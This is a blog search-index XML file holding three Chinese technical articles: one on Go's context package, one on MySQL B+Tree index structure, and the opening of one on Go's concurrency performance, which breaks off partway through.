<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>context详解</title>
    <url>/2020/08/20/golang_context/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>context.Context 是golang中独特的涉及,可以用来用来设置截止日期、同步信号，传递请求相关值的结构体。<br>与 Goroutine 有比较密切的关系。</p>
<p>在web程序中，每个Request都需要开启一个goroutine做一些事情，这些goroutine又可能会开启其他的<br>goroutine去访问后端资源,比如数据库、RPC服务等,它们需要访问一些共享的资源，比如用户身份信息、认证token、请求截止时间等<br>这时候可以通过Context，来跟踪这些goroutine，并且通过Context来控制它们，<br>这就是Go语言为我们提供的Context，中文可以称之为“上下文”。</p>
<h1 id="Context-定义"><a href="#Context-定义" class="headerlink" title="Context 定义"></a>Context 定义</h1><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Context <span class="keyword">interface</span> &#123;</span><br><span class="line"></span><br><span class="line">    Deadline() (deadline time.Time, ok <span class="keyword">bool</span>)</span><br><span class="line"></span><br><span class="line">    Done() &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    Err() error</span><br><span class="line"></span><br><span class="line">    Value(key <span class="keyword">interface</span>&#123;&#125;) <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li>Deadline方法是获取设置的截止时间的意思，第一个返回值是截止时间，到了这个时间点，Context会自动发起取消请求；<br>第二个返回值ok==false时表示没有设置截止时间，如果需要取消的话，需要调用取消函数进行取消。</li>
<li>Done方法返回一个只读的chan，类型为struct{}，在goroutine中，如果该方法返回的chan可以读取，则意味着parent context已经发起了取消请求，<br>我们通过Done方法收到这个信号后，就应该做清理操作，然后退出goroutine，释放资源。之后，Err 方法会返回一个错误，告知为什么 Context 被取消。</li>
<li>Err方法返回取消的错误原因，因为什么Context被取消。</li>
<li>Value方法获取该Context上绑定的值，是一个键值对，通过一个Key才可以获取对应的值，这个值一般是线程安全的。</li>
</ol>
<h1 id="默认上下文"><a href="#默认上下文" class="headerlink" title="默认上下文"></a>默认上下文</h1><p>context 包中最常用的方法还是 context.Background、context.TODO，这两个方法都会返回预先初始化好的私有变量 background 和 todo，<br>它们会在同一个 Go 程序中被复用：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Background</span><span class="params">()</span> <span class="title">Context</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> background</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TODO</span><span class="params">()</span> <span class="title">Context</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> todo</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个私有变量都是通过 new(emptyCtx) 语句初始化的，它们是指向私有结构体 context.emptyCtx 的指针，这是最简单、最常用的上下文类型：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> emptyCtx <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*emptyCtx)</span> <span class="title">Deadline</span><span class="params">()</span> <span class="params">(deadline time.Time, ok <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*emptyCtx)</span> <span class="title">Done</span><span class="params">()</span> &lt;-<span class="title">chan</span> <span class="title">struct</span></span>&#123;&#125; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*emptyCtx)</span> <span class="title">Err</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*emptyCtx)</span> <span class="title">Value</span><span class="params">(key <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">interface</span></span>&#123;&#125; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上述代码，我们不难发现 context.emptyCtx 通过返回 nil 实现了 context.Context 接口，它没有任何特殊的功能。<br>从源代码来看，context.Background 和 context.TODO 函数其实也只是互为别名，没有太大的差别。它们只是在使用和语义上稍有不同：</p>
<p>context.Background 是上下文的默认值，所有其他的上下文都应该从它衍生（Derived）出来；<br>context.TODO 应该只在不确定应该使用哪种上下文时使用；<br>在多数情况下，如果当前函数没有上下文作为入参，我们都会使用 context.Background 作为起始的上下文向下传递</p>
<h1 id="With-系列函数详解"><a href="#With-系列函数详解" class="headerlink" title="With 系列函数详解"></a>With 系列函数详解</h1><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传递一个父Context作为参数，返回子Context，以及一个取消函数用来取消Context。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithCancel</span><span class="params">(parent Context)</span> <span class="params">(ctx Context, cancel CancelFunc)</span></span></span><br><span class="line"><span class="comment">// 和WithCancel差不多，它会多传递一个截止时间参数，意味着到了这个时间点，会自动取消Context，</span></span><br><span class="line"><span class="comment">// 当然我们也可以不等到这个时候，可以提前通过取消函数进行取消。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithDeadline</span><span class="params">(parent Context, deadline time.Time)</span> <span class="params">(Context, CancelFunc)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// WithTimeout和WithDeadline基本上一样，这个表示是超时自动取消，是多少时间后自动取消Context的意思</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithTimeout</span><span class="params">(parent Context, timeout time.Duration)</span> <span class="params">(Context, CancelFunc)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//WithValue函数和取消Context无关，它是为了生成一个绑定了一个键值对数据的Context，</span></span><br><span class="line"><span class="comment">// 绑定的数据可以通过Context.Value方法访问到，这是我们实际用经常要用到的技巧，一般我们想要通过上下文来传递数据时，可以通过这个方法，</span></span><br><span class="line"><span class="comment">// 如我们需要tarce追踪系统调用栈的时候。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithValue</span><span class="params">(parent Context, key, val <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">Context</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="WithCancel"><a href="#WithCancel" class="headerlink" title="WithCancel"></a>WithCancel</h2><p>context.WithCancel 函数能够从 context.Context 中衍生出一个新的子上下文并返回用于取消该上下文的函数（CancelFunc）。<br>一旦我们执行返回的取消函数，当前上下文以及它的子上下文都会被取消，所有的 Goroutine 都会同步收到这一取消信号。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newCancelCtx</span><span class="params">(parent Context)</span> <span class="title">cancelCtx</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> cancelCtx&#123;</span><br><span class="line">        Context: parent,</span><br><span class="line">        done:    <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithCancel</span><span class="params">(parent Context)</span> <span class="params">(ctx Context, cancel CancelFunc)</span></span> &#123;</span><br><span class="line">    c := newCancelCtx(parent)</span><br><span class="line">    propagateCancel(parent, &amp;c)</span><br><span class="line">    <span class="keyword">return</span> &amp;c, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; c.cancel(<span class="literal">true</span>, Canceled) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>context.newCancelCtx 将传入的上下文包装成私有结构体 context.cancelCtx；<br>context.propagateCancel 会构建父子上下文之间的关联，当父上下文被取消时，子上下文也会被取消：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">propagateCancel</span><span class="params">(parent Context, child canceler)</span></span> &#123;</span><br><span class="line">    done := parent.Done()</span><br><span class="line">    <span class="keyword">if</span> done == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="comment">// 父上下文不会触发取消信号</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-done:</span><br><span class="line">        child.cancel(<span class="literal">false</span>, parent.Err()) <span class="comment">// 父上下文已经被取消</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p, ok := parentCancelCtx(parent); ok &#123;</span><br><span class="line">        p.mu.Lock()</span><br><span class="line">        <span class="keyword">if</span> p.err != <span class="literal">nil</span> &#123;</span><br><span class="line">            child.cancel(<span class="literal">false</span>, p.err)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            p.children[child] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        p.mu.Unlock()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> &lt;-parent.Done():</span><br><span class="line">                child.cancel(<span class="literal">false</span>, parent.Err())</span><br><span class="line">            <span class="keyword">case</span> &lt;-child.Done():</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述函数总共与父上下文相关的三种不同的情况：</p>
<ol>
<li>当 parent.Done() == nil，也就是 parent 不会触发取消事件时，当前函数会直接返回；</li>
<li>当 child 的继承链包含可以取消的上下文时，会判断 parent 是否已经触发了取消信号；<ul>
<li>如果已经被取消，child 会立刻被取消；</li>
<li>如果没有被取消，child 会被加入 parent 的 children 列表中，等待 parent 释放取消信号；</li>
</ul>
</li>
<li>在默认情况下<br>运行一个新的 Goroutine 同时监听 parent.Done() 和 child.Done() 两个 Channel<br>在 parent.Done() 关闭时调用 child.cancel 取消子上下文；<br><code>context.propagateCancel</code> 的作用是在 parent 和 child 之间同步取消和结束的信号，保证在 parent 被取消时，child 也会收到对应的信号，不会发生状态不一致的问题。</li>
</ol>
<p><code>context.cancelCtx</code> 实现的几个接口方法也没有太多值得分析的地方，该结构体最重要的方法是 cancel，这个方法会关闭上下文中的 Channel 并向所有的子上下文同步取消信号：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cancelCtx)</span> <span class="title">cancel</span><span class="params">(removeFromParent <span class="keyword">bool</span>, err error)</span></span> &#123;</span><br><span class="line">    c.mu.Lock()</span><br><span class="line">    <span class="keyword">if</span> c.err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.mu.Unlock()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.err = err</span><br><span class="line">    <span class="keyword">if</span> c.done == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.done = closedchan</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">close</span>(c.done)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> child := <span class="keyword">range</span> c.children &#123;</span><br><span class="line">        child.cancel(<span class="literal">false</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    c.children = <span class="literal">nil</span></span><br><span class="line">    c.mu.Unlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> removeFromParent &#123;</span><br><span class="line">        removeChild(c.Context, c)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="WithTimeout"><a href="#WithTimeout" class="headerlink" title="WithTimeout"></a>WithTimeout</h2><p>在这段代码中，我们创建了一个过期时间为 1s 的上下文，并向上下文传入 handle 函数，该方法会使用 500ms 的时间处理传入的『请求』：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ctx, cancel := context.WithTimeout(context.Background(), <span class="number">1</span>*time.Second)</span><br><span class="line">    <span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> handle(ctx, <span class="number">500</span>*time.Millisecond)</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">        fmt.Println(<span class="string">&quot;main&quot;</span>, ctx.Err())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(ctx context.Context, duration time.Duration)</span></span> &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">        fmt.Println(<span class="string">&quot;handle&quot;</span>, ctx.Err())</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(duration):</span><br><span class="line">        fmt.Println(<span class="string">&quot;process request with&quot;</span>, duration)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为过期时间大于处理时间，所以我们有足够的时间处理该『请求』，运行上述代码会打印出如下所示的内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> go run context.go</span></span><br><span class="line">process request with 500ms</span><br><span class="line">main context deadline exceeded</span><br></pre></td></tr></table></figure>

<p>handle 函数没有进入超时的 select 分支，但是 main 函数的 select 却会等待 context.Context 的超时并打印出 main context deadline exceeded。</p>
<p>如果我们将处理『请求』时间增加至 1500ms，整个程序都会因为上下文的过期而被中止，：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> go run context.go</span></span><br><span class="line">main context deadline exceeded</span><br><span class="line">handle context deadline exceeded</span><br></pre></td></tr></table></figure>

<p> 多个 Goroutine 同时订阅 ctx.Done() 管道中的消息，一旦接收到取消信号就立刻停止当前正在执行的工作。</p>
<h1 id="使用原则"><a href="#使用原则" class="headerlink" title="使用原则"></a>使用原则</h1><ul>
<li>不要把Context放在结构体中，要以参数的方式传递，parent Context一般为Background</li>
<li>应该要把Context作为第一个参数传递给入口请求和出口请求链路上的每一个函数，放在第一位，变量名建议都统一，如ctx。</li>
<li>给一个函数方法传递Context的时候，不要传递nil，否则在tarce追踪的时候，就会断了连接</li>
<li>Context的Value相关方法应该传递必须的数据，不要什么数据都使用这个传递</li>
<li>Context是线程安全的，可以放心的在多个goroutine中传递</li>
<li>可以把一个 Context 对象传递给任意个数的 gorotuine，对它执行 取消 操作时，所有<br>goroutine 都会接收到取消信号。</li>
</ul>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>Go 语言中的 context.Context 的主要作用还是在多个 Goroutine 组成的树中同步取消信号以减少<br>对资源的消耗和占用，虽然它也有传值的功能，但是这个功能我们还是很少用到。</p>
<p>在真正使用传值的功能时我们也应该非常谨慎，使用 context.Context 进行传递参数请求的所有参数一<br>种非常差的设计，比较常见的使用场景是传递请求对应用户的认证令牌以及用于进行分布式追踪的请求 ID。</p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>context</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL中B+Tree索引原理</title>
    <url>/2018/09/10/MySQL%E4%B8%ADB+Tree%E7%B4%A2%E5%BC%95%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<blockquote>
<p>B+树索引是B+树在<a href="http://lib.csdn.net/base/mysql" title="MySQL知识库">数据库</a>中的一种实现，是最常见也是数据库中使用最为频繁的一种索引。B+树中的B代表平衡（balance），而不是二叉（binary），因为B+树是从最早的平衡二叉树演化而来的。在讲B+树之前必须先了解二叉查找树、平衡二叉树（AVLTree）和平衡多路查找树（B-Tree），B+树即由这些树逐步优化而来。</p>
</blockquote>
<h1 id="二叉查找树"><a href="#二叉查找树" class="headerlink" title="二叉查找树 "></a>二叉查找树 </h1><p> 二叉树具有以下性质：左子树的键值小于根的键值，右子树的键值大于根的键值。<br>如下图所示就是一棵二叉查找树，<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202203355523.png" alt="索引"><br>对该二叉树的节点进行查找发现深度为1的节点的查找次数为1，深度为2的查找次数为2，深度为n的节点的查找次数为n，因此其平均查找次数为 (1+2+2+3+3+3) / 6 = 2.3次</p>
<p> 二叉查找树可以任意地构造，同样是2,3,5,6,7,8这六个数字，也可以按照下图的方式来构造：<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202203448944.png" alt="索引"><br>但是这棵二叉树的查询效率就低了。因此若想二叉树的查询效率尽可能高，需要这棵二叉树是平衡的，从而引出新的定义——平衡二叉树，或称AVL树。</p>
<h1 id="平衡二叉树（AVL-Tree）"><a href="#平衡二叉树（AVL-Tree）" class="headerlink" title="平衡二叉树（AVL Tree） "></a>平衡二叉树（AVL Tree） </h1><p> 平衡二叉树（AVL树）在符合二叉查找树的条件下，还满足任何节点的两个子树的高度最大差为1。下面的两张图片，左边是AVL树，它的任何节点的两个子树的高度差&lt;=1；右边的不是AVL树，其根节点的左子树高度为3，而右子树高度为1；<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202203554663.png" alt="索引"></p>
<p> 如果在AVL树中进行插入或删除节点，可能导致AVL树失去平衡，这种失去平衡的二叉树可以概括为四种姿态：LL（左左）、RR（右右）、LR（左右）、RL（右左）。它们的示意图如下：<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202203648148.png" alt="索引"></p>
<p> 这四种失去平衡的姿态都有各自的定义：<br>LL：LeftLeft，也称“左左”。插入或删除一个节点后，根节点的左孩子（Left Child）的左孩子（Left Child）还有非空节点，导致根节点的左子树高度比右子树高度高2，AVL树失去平衡。</p>
<p> RR：RightRight，也称“右右”。插入或删除一个节点后，根节点的右孩子（Right Child）的右孩子（Right Child）还有非空节点，导致根节点的右子树高度比左子树高度高2，AVL树失去平衡。</p>
<p> LR：LeftRight，也称“左右”。插入或删除一个节点后，根节点的左孩子（Left Child）的右孩子（Right Child）还有非空节点，导致根节点的左子树高度比右子树高度高2，AVL树失去平衡。</p>
<p> RL：RightLeft，也称“右左”。插入或删除一个节点后，根节点的右孩子（Right Child）的左孩子（Left Child）还有非空节点，导致根节点的右子树高度比左子树高度高2，AVL树失去平衡。</p>
<p> AVL树失去平衡之后，可以通过旋转使其恢复平衡。下面分别介绍四种失去平衡的情况下对应的旋转方法。</p>
<p> LL的旋转。LL失去平衡的情况下，可以通过一次旋转让AVL树恢复平衡。步骤如下：</p>
<ol>
<li><p>将根节点的左孩子作为新根节点。</p>
</li>
<li><p>将新根节点的右孩子作为原根节点的左孩子。</p>
</li>
<li><p>将原根节点作为新根节点的右孩子。</p>
<p>LL旋转示意图如下：<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202204113994.png" alt="索引"></p>
<p>RR的旋转：RR失去平衡的情况下，旋转方法与LL旋转对称，步骤如下：</p>
</li>
<li><p>将根节点的右孩子作为新根节点。</p>
</li>
<li><p>将新根节点的左孩子作为原根节点的右孩子。</p>
</li>
<li><p>将原根节点作为新根节点的左孩子。</p>
<p>RR旋转示意图如下：<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202204207963.png" alt="索引"></p>
<p>LR的旋转：LR失去平衡的情况下，需要进行两次旋转，步骤如下：</p>
</li>
<li><p>围绕根节点的左孩子进行RR旋转。</p>
</li>
<li><p>围绕根节点进行LL旋转。</p>
<p>LR的旋转示意图如下：<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202204257369.png" alt="索引"></p>
<p>RL的旋转：RL失去平衡的情况下也需要进行两次旋转，旋转方法与LR旋转对称，步骤如下：</p>
</li>
<li><p>围绕根节点的右孩子进行LL旋转。</p>
</li>
<li><p>围绕根节点进行RR旋转。</p>
<p>RL的旋转示意图如下：<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202204331073.png" alt="索引"></p>
</li>
</ol>
<h1 id="平衡多路查找树（B-Tree）"><a href="#平衡多路查找树（B-Tree）" class="headerlink" title="平衡多路查找树（B-Tree） "></a>平衡多路查找树（B-Tree） </h1><p> B-Tree是为磁盘等外存储设备设计的一种平衡查找树。因此在讲B-Tree之前先了解下磁盘的相关知识。</p>
<p> 系统从磁盘读取数据到内存时是以磁盘块（block）为基本单位的，位于同一个磁盘块中的数据会被一次性读取出来，而不是需要什么取什么。</p>
<p> InnoDB存储引擎中有页（Page）的概念，页是其磁盘管理的最小单位。InnoDB存储引擎中默认每个页的大小为16KB，可通过参数innodb_page_size将页的大小设置为4K、8K、16K，在<a href="http://lib.csdn.net/base/mysql" title="MySQL知识库">MySQL</a>中可通过如下命令查看页的大小：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;innodb_page_size&#39;;</span><br></pre></td></tr></table></figure>

<p> 而系统一个磁盘块的存储空间往往没有这么大，因此InnoDB每次申请磁盘空间时都会是若干地址连续磁盘块来达到页的大小16KB。InnoDB在把磁盘数据读入到磁盘时会以页为基本单位，在查询数据时如果一个页中的每条数据都能有助于定位数据记录的位置，这将会减少磁盘I/O次数，提高查询效率。</p>
<p> B-Tree结构的数据可以让系统高效的找到数据所在的磁盘块。为了描述B-Tree，首先定义一条记录为一个二元组[key, data] ，key为记录的键值，对应表中的主键值，data为一行记录中除主键外的数据。对于不同的记录，key值互不相同。</p>
<p> 一棵m阶的B-Tree有如下特性：   </p>
<ol>
<li><p>每个节点最多有m个孩子。   </p>
</li>
<li><p>除了根节点和叶子节点外，其它每个节点至少有Ceil(m/2)个孩子。   </p>
</li>
<li><p>若根节点不是叶子节点，则至少有2个孩子   </p>
</li>
<li><p>所有叶子节点都在同一层，且不包含其它关键字信息   </p>
</li>
<li><p>每个非终端节点包含n个关键字信息（P0,P1,…Pn, k1,…kn）   </p>
</li>
<li><p>关键字的个数n满足：ceil(m/2)-1 &lt;= n &lt;= m-1   </p>
</li>
<li><p>ki(i=1,…n)为关键字，且关键字升序排序。   </p>
</li>
<li><p>Pi(i=1,…n)为指向子树根节点的指针。P(i-1)指向的子树的所有节点关键字均小于ki，但都大于k(i-1)</p>
<p>B-Tree中的每个节点根据实际情况可以包含大量的关键字信息和分支，如下图所示为一个3阶的B-Tree：<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202204827368.png" alt="索引"></p>
<p>每个节点占用一个盘块的磁盘空间，一个节点上有两个升序排序的关键字和三个指向子树根节点的指针，指针存储的是子节点所在磁盘块的地址。两个关键词划分成的三个范围域对应三个指针指向的子树的数据的范围域。以根节点为例，关键字为17和35，P1指针指向的子树的数据范围为小于17，P2指针指向的子树的数据范围为17~35，P3指针指向的子树的数据范围为大于35。</p>
<p>模拟查找关键字29的过程：</p>
</li>
<li><p>根据根节点找到磁盘块1，读入内存。【磁盘I/O操作第1次】</p>
</li>
<li><p>比较关键字29在区间（17,35），找到磁盘块1的指针P2。</p>
</li>
<li><p>根据P2指针找到磁盘块3，读入内存。【磁盘I/O操作第2次】</p>
</li>
<li><p>比较关键字29在区间（26,30），找到磁盘块3的指针P2。</p>
</li>
<li><p>根据P2指针找到磁盘块8，读入内存。【磁盘I/O操作第3次】</p>
</li>
<li><p>在磁盘块8中的关键字列表中找到关键字29。</p>
<p>分析上面过程，发现需要3次磁盘I/O操作，和3次内存查找操作。由于内存中的关键字是一个有序表结构，可以利用二分法查找提高效率。而3次磁盘I/O操作是影响整个B-Tree查找效率的决定因素。B-Tree相对于AVLTree缩减了节点个数，使每次磁盘I/O取到内存的数据都发挥了作用，从而提高了查询效率。</p>
</li>
</ol>
<h1 id="B-Tree"><a href="#B-Tree" class="headerlink" title="B+Tree "></a>B+Tree </h1><p> B+Tree是在B-Tree基础上的一种优化，使其更适合实现外存储索引结构，InnoDB存储引擎就是用B+Tree实现其索引结构。</p>
<p> 从上一节中的B-Tree结构图中可以看到每个节点中不仅包含数据的key值，还有data值。而每一个页的存储空间是有限的，如果data数据较大时将会导致每个节点（即一个页）能存储的key的数量很小，当存储的数据量很大时同样会导致B-Tree的深度较大，增大查询时的磁盘I/O次数，进而影响查询效率。在B+Tree中，所有数据记录节点都是按照键值大小顺序存放在同一层的叶子节点上，而非叶子节点上只存储key值信息，这样可以大大加大每个节点存储的key值数量，降低B+Tree的高度。</p>
<p> B+Tree相对于B-Tree有几点不同：</p>
<ol>
<li><p>非叶子节点只存储键值信息。</p>
</li>
<li><p>所有叶子节点之间都有一个链指针。</p>
</li>
<li><p>数据记录都存放在叶子节点中。</p>
<p>将上一节中的B-Tree优化，由于B+Tree的非叶子节点只存储键值信息，假设每个磁盘块能存储4个键值及指针信息，则变成B+Tree后其结构如下图所示：<br><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160202205105560.png" alt="索引"></p>
<p>通常在B+Tree上有两个头指针，一个指向根节点，另一个指向关键字最小的叶子节点，而且所有叶子节点（即数据节点）之间是一种链式环结构。因此可以对B+Tree进行两种查找运算：一种是对于主键的范围查找和分页查找，另一种是从根节点开始，进行随机查找。</p>
<p>可能上面例子中只有22条数据记录，看不出B+Tree的优点，下面做一个推算：</p>
<p>InnoDB存储引擎中页的大小为16KB，一般表的主键类型为INT（占用4个字节）或BIGINT（占用8个字节），指针类型也一般为4或8个字节，也就是说一个页（B+Tree中的一个节点）中大概存储16KB/(8B+8B)=1K个键值（因为是估值，为方便计算，这里的K取值为〖10〗^3）。也就是说一个深度为3的B+Tree索引可以维护10^3 * 10^3 * 10^3 = 10亿 条记录。</p>
<p>实际情况中每个节点可能不能填充满，因此在数据库中，B+Tree的高度一般都在2<del>4层。<a href="http://lib.csdn.net/base/mysql" title="MySQL知识库">mysql</a>的InnoDB存储引擎在设计时是将根节点常驻内存的，也就是说查找某一键值的行记录时最多只需要1</del>3次磁盘I/O操作。</p>
<p>数据库中的B+Tree索引可以分为聚集索引（clustered index）和辅助索引（secondary index）。上面的B+Tree示例图在数据库中的实现即为聚集索引，聚集索引的B+Tree中的叶子节点存放的是整张表的行记录数据。辅助索引与聚集索引的区别在于辅助索引的叶子节点并不包含行记录的全部数据，而是存储相应行数据的聚集索引键，即主键。当通过辅助索引来查询数据时，InnoDB存储引擎会遍历辅助索引找到主键，然后再通过主键在聚集索引中找到完整的行记录数据。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Go为什么这么&quot;快&quot;</title>
    <url>/2020/08/31/why_go_so_fast/</url>
    <content><![CDATA[<blockquote>
<p>本文主要介绍了 Go 程序为了实现极高的并发性能，其内部调度器的实现架构（G-P-M 模型），以及为了最大限度利用计算资源，Go 调度器是如何处理线程阻塞的场景<br>怎么让我们的系统更快</p>
</blockquote>
<h1 id="怎么让我们的系统更快"><a href="#怎么让我们的系统更快" class="headerlink" title="怎么让我们的系统更快"></a>怎么让我们的系统更快</h1><p>随着信息技术的迅速发展，单台服务器处理能力越来越强，迫使编程模式由从前的串行模式升级到并发模型。</p>
<p>并发模型包含 IO 多路复用、多进程以及多线程，这几种模型都各有优劣，现代复杂的高并发架构大多是几种模型协同使用，不同场景应用不同模型，扬长避短，发挥服务器的最大性能。</p>
<p>而<strong>多线程，因为其轻量和易用</strong>，成为并发编程中使用频率最高的并发模型，包括后衍生的协程等其他子产品，也都基于它。</p>
<h1 id="并发-≠-并行"><a href="#并发-≠-并行" class="headerlink" title="并发 ≠ 并行"></a>并发 ≠ 并行</h1><p><strong>并发 (concurrency) 和 并行 ( parallelism) 是不同的。</strong></p>
<p>在单个 CPU 核上，线程通过时间片或者让出控制权来实现任务切换，达到 “同时” 运行多个任务的目的，这就是所谓的并发。但实际上任何时刻都只有一个任务被执行，其他任务通过某种算法来排队。</p>
<p>多核 CPU 可以让同一进程内的 “多个线程” 做到真正意义上的同时运行，这才是并行。</p>
<h1 id="进程、线程、协程"><a href="#进程、线程、协程" class="headerlink" title="进程、线程、协程"></a>进程、线程、协程</h1><p>进程：进程是系统进行资源分配的基本单位，有独立的内存空间。</p>
<p>线程：线程是 CPU 调度和分派的基本单位，线程依附于进程存在，每个线程会共享父进程的资源。</p>
<p>协程：<strong>协程是一种用户态的轻量级线程</strong>，协程的调度完全由用户控制，协程间切换只需要保存任务的上下文，没有内核的开销。</p>
<h1 id="线程上下文切换"><a href="#线程上下文切换" class="headerlink" title="线程上下文切换"></a>线程上下文切换</h1><p>由于中断处理，多任务处理，用户态切换等原因会导致 CPU 从一个线程切换到另一个线程，切换过程需要保存当前进程的状态并恢复另一个进程的状态。</p>
